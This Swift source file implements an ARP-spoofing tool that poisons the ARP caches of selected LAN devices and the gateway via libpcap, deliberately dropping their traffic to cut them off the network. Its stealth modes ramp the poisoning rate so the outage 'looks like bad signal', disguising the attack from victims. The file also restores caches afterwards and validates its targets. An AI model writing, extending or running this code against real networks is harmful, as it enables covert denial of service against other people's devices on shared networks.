import Foundation

/// Native libpcap-based ARP spoofer. Replaces ettercap.
///
/// Strategy:
///   - Bidirectional poison: tell the gateway that target_ip→our_mac, and tell
///     the target that gateway_ip→our_mac. We DO NOT forward traffic, so both
///     sides drop their packets at us, effectively cutting the target.
///   - Stealth modes ramp poison probability over time so the cut looks like
///     bad signal.
///   - All replies are addressed to selected peers; never claim an IP globally.
///   - Restore on removal/stop: repair both device and gateway caches.
actor ARPSpoofer {

    enum BlockMode: String { case instant, stealth, stealthSlow }

    struct Target: Hashable {
        let ip: String
        let mac: MACAddress
    }

    private var context: NetworkContext
    private var handle: UnsafeMutableRawPointer?
    private var targets: Set<Target> = []
    private var task: Task<Void, Never>?
    private var startedAt: Date = .now
    private var mode: BlockMode = .instant
    private var paused: Bool = false
    private var injectOK: Int = 0
    private var injectFail: Int = 0
    private var lastReportAt: Date = .distantPast
    private var generation: UInt64 = 0
    private var bindings: [String: Target] = [:]
    private let onFailure: @Sendable (String) -> Void
    private var failed = false

    init(context: NetworkContext, onFailure: @escaping @Sendable (String) -> Void) {
        self.context = context
        self.onFailure = onFailure
    }

    /// A changed LAN invalidates the session. Do not repair old peer mappings
    /// on the new LAN or let an inventory update revive the old session.
    func setContext(_ ctx: NetworkContext) {
        if !Self.sameLAN(context, ctx) { close(restore: false) }
        self.context = Self.retainingKnownIdentity(ctx, previous: context)
    }

    func start(targets: [Target], mode: BlockMode, bindings: [Target]) async throws {
        guard !failed else { throw failure("Packet session requires cleanup before restarting.") }
        guard Self.validContext(context) else {
            throw NSError(domain: "ARPSpoofer", code: 2,
                          userInfo: [NSLocalizedDescriptionKey: "A valid local and gateway identity is required."])
        }
        if handle == nil {
            var errbuf = [CChar](repeating: 0, count: 256)
            guard let h = wm_arp_open(context.interface, &errbuf) else {
                throw NSError(domain: "ARPSpoofer", code: 1,
                              userInfo: [NSLocalizedDescriptionKey: String(cString: errbuf)])
            }
            self.handle = h
        }
        try replaceTargets(targets, bindings: bindings)
        self.mode = mode
        self.startedAt = .now
        self.paused = false
        if task == nil {
            generation &+= 1
            let currentGeneration = generation
            task = Task.detached(priority: .userInitiated) { [weak self] in
                await self?.loop(generation: currentGeneration)
            }
        }
    }

    func update(targets: [Target], bindings: [Target]) throws {
        guard task != nil, !failed, Self.validContext(context) else {
            throw failure("Packet session is inactive or its network identity changed.")
        }
        try replaceTargets(targets, bindings: bindings)
    }

    private func replaceTargets(_ proposed: [Target], bindings: [Target]) throws {
        self.bindings = Self.validatedBindings(bindings, context: context)
        let next = Set(Self.validatedTargets(proposed, context: context).filter {
            self.bindings[$0.ip] == $0
        })
        guard sendRestoreBurst(for: targets.subtracting(next)) else {
            fail("ARP cache restoration failed; the cut session was stopped.")
            throw failure("ARP cache restoration failed.")
        }
        targets = next
    }

    func pause(seconds: Int) {
        paused = true
        let currentGeneration = generation
        Task {
            try? await Task.sleep(nanoseconds: UInt64(max(0, seconds)) * 1_000_000_000)
            self.unpause(generation: currentGeneration)
        }
    }

    private func unpause(generation: UInt64) {
        if self.generation == generation { paused = false }
    }

    func stop(restore: Bool = true, bindings: [Target]? = nil) {
        if let bindings { self.bindings = Self.validatedBindings(bindings, context: context) }
        close(restore: restore)
    }

    private func close(restore: Bool) {
        generation &+= 1
        task?.cancel()
        task = nil
        let restored = !restore || sendRestoreBurst(for: targets)
        if let h = handle {
            wm_arp_close(h)
            handle = nil
        }
        targets.removeAll()
        bindings.removeAll()
        paused = false
        let shouldReport = !restored && !failed
        failed = false
        if shouldReport { onFailure("ARP cache restoration failed while stopping.") }
    }

    // MARK: loop

    private func loop(generation: UInt64) async {
        while !Task.isCancelled && self.generation == generation {
            if !paused { tick() }
            try? await Task.sleep(nanoseconds: 100_000_000)
        }
    }

    private func tick() {
        guard let h = handle, !targets.isEmpty else { return }
        let mac = context.selfMAC.bytes
        let elapsed = Date.now.timeIntervalSince(startedAt)
        let p = poisonProbability(at: elapsed)
        let gwMacOpt = context.gatewayMAC?.bytes

        for t in targets {
            // Random sampling in stealth modes.
            if Double.random(in: 0..<1) > p { continue }

            // Poison victim: gateway_ip → our_mac
            let r1 = context.gatewayIPv4.withCString { gw in
                t.ip.withCString { vIP in
                    mac.withUnsafeBufferPointer { our in
                        let victimMac = t.mac.bytes
                        return victimMac.withUnsafeBufferPointer { vm in
                            wm_arp_send_spoof(h,
                                              our.baseAddress,
                                              vm.baseAddress,
                                              vIP, gw)
                        }
                    }
                }
            }
            guard r1 == 0 else {
                injectFail += 1
                fail("ARP packet injection failed; the cut session was stopped.")
                return
            }
            injectOK += 1

            // Poison gateway: target_ip → our_mac
            if let gwMac = gwMacOpt {
                let r2 = t.ip.withCString { tIP in
                    context.gatewayIPv4.withCString { gwIP in
                        mac.withUnsafeBufferPointer { our in
                            gwMac.withUnsafeBufferPointer { gm in
                                wm_arp_send_spoof(h,
                                                  our.baseAddress,
                                                  gm.baseAddress,
                                                  gwIP, tIP)
                            }
                        }
                    }
                }
                guard r2 == 0 else {
                    injectFail += 1
                    fail("ARP packet injection failed; the cut session was stopped.")
                    return
                }
                injectOK += 1
            }
        }

        // Periodic visibility — without this you can't tell whether the
        // C-side pcap_inject is actually working or silently failing on
        // every frame (e.g., kernel rejecting BPF writes on macOS Wi-Fi).
        let now = Date.now
        if now.timeIntervalSince(lastReportAt) > 5 {
            Log.arp.info("spoof tick: ok=\(self.injectOK, privacy: .public) fail=\(self.injectFail, privacy: .public) targets=\(self.targets.count, privacy: .public) gwMac=\(gwMacOpt == nil ? "nil" : "ok", privacy: .public)")
            lastReportAt = now
        }
    }

    private func poisonProbability(at elapsed: TimeInterval) -> Double {
        switch mode {
        case .instant:     return 1.0
        case .stealth:     return min(1.0, 0.10 + (elapsed / 60.0) * 0.90)
        case .stealthSlow: return min(1.0, 0.10 + (elapsed / 300.0) * 0.90)
        }
    }

    private func sendRestoreBurst(for removed: Set<Target>) -> Bool {
        guard !removed.isEmpty else { return true }
        guard let h = handle, let gwMac = context.gatewayMAC?.bytes else { return false }
        for oldTarget in removed {
            // DHCP can reassign an old target IP to a trusted peer. Repair only
            // the current authoritative binding; absent/conflicting evidence
            // must never announce the old MAC to the gateway.
            guard let t = bindings[oldTarget.ip] else { continue }
            for _ in 0..<5 {
                let victimResult = context.gatewayIPv4.withCString { gw in
                    t.ip.withCString { vIP in
                        gwMac.withUnsafeBufferPointer { realGw in
                            let vm = t.mac.bytes
                            return vm.withUnsafeBufferPointer { victim in
                                wm_arp_send_restore(h,
                                                    realGw.baseAddress,
                                                    victim.baseAddress,
                                                    vIP, gw)
                            }
                        }
                    }
                }
                let gatewayResult = t.ip.withCString { targetIP in
                    context.gatewayIPv4.withCString { gatewayIP in
                        t.mac.bytes.withUnsafeBufferPointer { realTarget in
                            gwMac.withUnsafeBufferPointer { gateway in
                                wm_arp_send_restore(h, realTarget.baseAddress,
                                                    gateway.baseAddress, gatewayIP, targetIP)
                            }
                        }
                    }
                }
                if victimResult != 0 || gatewayResult != 0 { return false }
            }
        }
        return true
    }

    private func fail(_ message: String) {
        guard !failed else { return }
        failed = true
        generation &+= 1
        task?.cancel()
        task = nil
        paused = true
        // Keep the dormant handle and binding evidence until the controller
        // stops the responder first, then invokes stop() to repair caches.
        onFailure(message)
    }

    private func failure(_ message: String) -> NSError {
        NSError(domain: "ARPSpoofer", code: 3,
                userInfo: [NSLocalizedDescriptionKey: message])
    }

    static func sameLAN(_ a: NetworkContext, _ b: NetworkContext) -> Bool {
        a.interface == b.interface && a.selfIPv4 == b.selfIPv4 && a.selfMAC == b.selfMAC
            && a.selfIPv6.map { $0.lowercased() }.sorted() == b.selfIPv6.map { $0.lowercased() }.sorted()
            && a.gatewayIPv4 == b.gatewayIPv4 && sameKnown(a.gatewayMAC, b.gatewayMAC)
            && a.subnetCIDR == b.subnetCIDR
            && sameKnown(available(a.ssid), available(b.ssid))
            && sameKnown(available(a.bssid)?.lowercased(), available(b.bssid)?.lowercased())
    }

    private static func sameKnown<T: Equatable>(_ a: T?, _ b: T?) -> Bool {
        guard let a, let b else { return true }
        return a == b
    }

    private static func available(_ value: String?) -> String? {
        guard let value, !value.isEmpty, value != "<redacted>" else { return nil }
        return value
    }

    static func retainingKnownIdentity(_ next: NetworkContext, previous: NetworkContext) -> NetworkContext {
        guard sameLAN(previous, next) else { return next }
        var merged = next
        merged.gatewayMAC = next.gatewayMAC ?? previous.gatewayMAC
        merged.ssid = available(next.ssid) ?? available(previous.ssid)
        merged.bssid = available(next.bssid) ?? available(previous.bssid)
        return merged
    }

    static func ipv4Bytes(_ ip: String) -> [UInt8]? {
        var address = in_addr()
        guard !ip.utf8.contains(0),
              ip.withCString({ inet_pton(AF_INET, $0, &address) }) == 1 else { return nil }
        let bytes = withUnsafeBytes(of: address.s_addr) { Array($0) }
        guard bytes[0] != 0, bytes[0] != 127, bytes[0] < 224 else { return nil }
        return bytes
    }

    private static func unicastMAC(_ mac: MACAddress) -> Bool {
        mac.bytes.count == 6 && !mac.isMulticast && mac.bytes.contains { $0 != 0 }
    }

    private static func subnet(_ context: NetworkContext) -> (network: UInt32, mask: UInt32)? {
        let parts = context.subnetCIDR.split(separator: "/")
        guard parts.count == 2, let bytes = ipv4Bytes(String(parts[0])),
              let prefix = Int(parts[1]), (1...30).contains(prefix) else { return nil }
        let mask = UInt32.max << (32 - prefix)
        return (ipv4Value(bytes) & mask, mask)
    }

    private static func ipv4Value(_ bytes: [UInt8]) -> UInt32 {
        bytes.reduce(0) { ($0 << 8) | UInt32($1) }
    }

    private static func localHost(_ ip: String, context: NetworkContext) -> Bool {
        guard let bytes = ipv4Bytes(ip), let subnet = subnet(context) else { return false }
        let address = ipv4Value(bytes)
        return address & subnet.mask == subnet.network && address != subnet.network
            && address != (subnet.network | ~subnet.mask)
    }

    static func validContext(_ context: NetworkContext) -> Bool {
        guard !context.interface.isEmpty, unicastMAC(context.selfMAC),
              let gatewayMAC = context.gatewayMAC, unicastMAC(gatewayMAC),
              gatewayMAC != context.selfMAC, context.selfIPv4 != context.gatewayIPv4 else { return false }
        return localHost(context.selfIPv4, context: context)
            && localHost(context.gatewayIPv4, context: context)
    }

    static func validatedTargets(_ proposed: [Target], context: NetworkContext) -> Set<Target> {
        guard validContext(context) else { return [] }
        let safe = Set(proposed.filter {
            unicastMAC($0.mac) && $0.mac != context.selfMAC && $0.mac != context.gatewayMAC
                && $0.ip != context.selfIPv4 && $0.ip != context.gatewayIPv4
                && localHost($0.ip, context: context)
        })
        let byIP = Dictionary(grouping: safe, by: \.ip)
        let byMAC = Dictionary(grouping: safe, by: \.mac)
        return Set(safe.filter { byIP[$0.ip]?.count == 1 && byMAC[$0.mac]?.count == 1 })
    }

    private static func validatedBindings(_ proposed: [Target], context: NetworkContext) -> [String: Target] {
        let safe = validatedTargets(proposed, context: context)
        return Dictionary(uniqueKeysWithValues: safe.map { ($0.ip, $0) })
    }
}
